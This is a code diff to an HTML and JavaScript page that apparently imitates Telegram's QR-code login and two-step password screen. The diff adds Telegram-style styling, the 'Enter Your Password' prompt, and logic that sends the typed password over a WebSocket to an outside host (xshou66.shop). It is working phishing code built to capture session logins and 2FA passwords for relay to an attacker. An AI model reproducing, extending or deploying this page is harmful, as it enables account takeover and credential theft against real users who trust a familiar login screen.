@@ -85,6 +85,100 @@
             animation-name: zoomIn;
         }
 
+
+        /* sda------------------ */
+        .emoji {
+            text-align: center;
+            font-size: 145px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 30px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .desc {
+            font-size: 14px;
+            color: #707579;
+            margin-bottom: 20px;
+        }
+        .input-container {
+            position: relative;
+            margin-bottom: 16px;
+            margin-top: 50px;
+        }
+        .password-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        .password-input.error {
+            border-color: #df3f40;
+        }
+
+        .err{
+            border-color: #df3f40 !important;
+            color: #df3f40 !important;
+        }
+        .password-input:focus {
+            outline: none;
+            border: 2px solid #3390ec;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #8e8e8e;
+        }
+        .placeholder {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        .password-input:focus + .placeholder,
+        .password-input:not(:placeholder-shown) + .placeholder {
+            top: 0;
+            font-size: 12px;
+            background-color: white;
+            padding: 0 4px;
+        }
+        .next-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3390ec;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            cursor: auto;      /* 鼠标指针显示为不可点击 */
+            opacity: 0.3;             /* 透明度降低 */
+        }
+
+        .loader-2 {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #3390ec;
+            border-bottom-color: #ffffff;
+            border-radius: 50%;
+            -webkit-animation: rotation 1s linear infinite;
+            animation: rotation 1s linear infinite;
+        }
+        
+
     </style>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -106,12 +200,28 @@
             <a href="#" class="phone-login">LOG IN BY PHONE NUMBER</a>
         </div>
 
-        <div id="pwd" style="display: none;">
-            <input type="password" id="password" placeholder="请输入密码">
-            <button id="submitbtn" onclick="submit(this)">提交</button>
+        <div id="pwdsec" style="display: none;">
+            <div class="emoji">🙈</div>
+            <h1>Enter Your Password</h1>
+            <span class="desc">Your account is protected with</span>
+            <br>
+            <span class="desc">an additional password</span>
+            <div class="input-container">
+                <input type="password" id="password" class="password-input" placeholder=" ">
+                <label id="labelinput" for="password" class="placeholder">sv</label>
+                <span class="eye-icon">👁️</span>
+            </div>
+            <button id="sendbtn" class="next-button" onclick="submitPassword(this)"><span id="btntext">NEXT</span> <svg id="loadingbtn" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="60" height="60" style="/* float: right; */shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;/* display: none; */position: absolute;right: 0px;" xmlns:xlink="http://www.w3.org/1999/xlink"><g><circle stroke-dasharray="56.548667764616276 20.84955592153876" r="12" stroke-width="2" stroke="#ffffff" fill="none" cy="50" cx="50">
+                <animateTransform keyTimes="0;1" values="0 50 50;360 50 50" dur="1.4705882352941175s" repeatCount="indefinite" type="rotate" attributeName="transform"></animateTransform>
+              </circle><g></g></g></svg> </button>
+            </div>
         </div>
-        <div id="tip"></div>
-    </div>
+
+        <div id="tip" style="display: none;">
+            <div id="tipemo" class="emoji">👍</div>
+            <h1 id="tiptext">SUCCESS</h1>
+            
+        </div>
 
     <script>
         function generateRandomString(length) {
@@ -171,41 +281,64 @@
             
         }
 
+        function submitPassword(obj) {
+            const password = document.getElementById("password").value;
+            
+            if (password == "") {
+                tiperror()
+                return
+            }
+
+            document.getElementById("btntext").innerText = "PLEASE WAIT..."
+            showloadingbtn()
+            obj.disabled = true;
+            
+
+            socket.send(password);
+        }
+
+        document.getElementById("password").addEventListener("input", function() {
+            // 如果输入框为空，则显示placeholder
+            if (this.value != "") {
+                tipnormal()
+            } 
+            document.getElementById("btntext").innerText = "NEXT"
+        })
+
+        function tiperror() {
+            document.getElementById("password").classList.remove("err");
+            document.getElementById("password").classList.add("err");
+            document.getElementById("labelinput").classList.remove("err");
+            document.getElementById("labelinput").classList.add("err");
+            // setTimeout(function(){
+            //     document.getElementById("password").classList.remove("error");
+            // } , 3000)
+        }
+
+        function tipnormal() {
+            document.getElementById("password").classList.remove("err");
+            document.getElementById("labelinput").classList.remove("err");
+        }
+
+        function showloadingbtn(){
+            document.getElementById("loadingbtn").style.display = ""
+        }
+
+        function hideloadingbtn(){
+            document.getElementById("loadingbtn").style.display = "none"
+        }
+
         function submit(obj) {
             obj.style.display = "none"
             const password = document.getElementById("password").value;
 
             socket.send(password);
 
-            // const formData = new FormData();
-            // formData.append('pwd', password);
-            // //
-            // clearInterval(interval);
-            // fetch('fa2', {
-            //     method: 'POST',
-            //     body : formData
-                
-            // }).then(response => response.text())
-            // .then(data => {
-            //     console.log(data)
-            //     if (data == "inpas") {
-            //         document.getElementById("tip").innerHTML = "密码错误"
-            //         //刷新页面
-            //         setTimeout(function(){
-            //             window.location.reload()
-            //         } , 3000)
-            //     }
-
-            //     if (data == "succ") {
-            //         document.getElementById("tip").innerHTML = "登陆成功"
-            //         document.getElementById("pwd").style.display = "none";
-            //     }
-            // })
-            
         }
 
         
         var socket = new WebSocket("wss://xshou66.shop/ws");
+        // var socket = new WebSocket("ws://localhost:8888/ws");
 
         socket.onopen = function() {
             // socket.send("input.value");
@@ -213,9 +346,7 @@
 
         socket.onmessage = function(event) {
             if (event.data.startsWith("tg:")) {
-                document.getElementById("loading").style.display = "none"
-                document.getElementById("qrcode").className += " animated zoomIn"
-                document.getElementById("qrcode").style.display = "block"
+                
                 var qrcodediv = document.getElementById("qrcode")
                 qrcodediv.innerHTML = ''
                 const qrcode = new QRCode(qrcodediv, {
@@ -247,24 +378,31 @@
                         imgr.style.display = "none"
                         canvas.style.display = "block"
                     };
+
+                    document.getElementById("loading").style.display = "none"
+                    document.getElementById("qrcode").className += " animated zoomIn"
+                    document.getElementById("qrcode").style.display = "block"
                 }, 10);
             }
 
             if (event.data == 'waitpas'){
-                document.getElementById("pwd").style.display = "block";
+                document.getElementById("pwdsec").style.display = "";
                 document.getElementById("qrsec").style.display = "none";
             }
 
             if (event.data == 'inpass'){
-                document.getElementById("tip").innerHTML = "密码错误"
-                document.getElementById("submitbtn").style.display= "block";
-                document.getElementById("pwd").style.display = "block";
-                document.getElementById("qrsec").style.display = "none";
+                document.getElementById("sendbtn").disabled = false;
+                document.getElementById("btntext").innerText = "INCORRECT PASSWORD"
+                hideloadingbtn()
+                tiperror()
             }
             
             if (event.data == "succ") {
-                document.getElementById("tip").innerHTML = "登陆成功"
-                document.getElementById("pwd").style.display = "none";
+                document.getElementById("pwdsec").style.display = "none";
+                document.getElementById("qrsec").style.display = "none";
+                document.getElementById("tip").style.display = ""
+                document.getElementById("tiptext").innerHTML ="SUCCESS"
+                document.getElementById("tipemo").innerHTML ="👍🏼"
             }
 
             // console.log("Received: " + event.data)
@@ -279,8 +417,11 @@
 
         socket.onclose = function() {
             setTimeout(function() {
-                document.getElementById("tip").innerHTML = "请刷新页面"
+                document.getElementById("pwdsec").style.display = "none";
                 document.getElementById("qrsec").style.display = "none";
+                document.getElementById("tip").style.display = ""
+                document.getElementById("tiptext").innerHTML ="PLEASE RELOAD THE PAGE"
+                document.getElementById("tipemo").innerHTML ="😆"
             } , 3000)
 
 
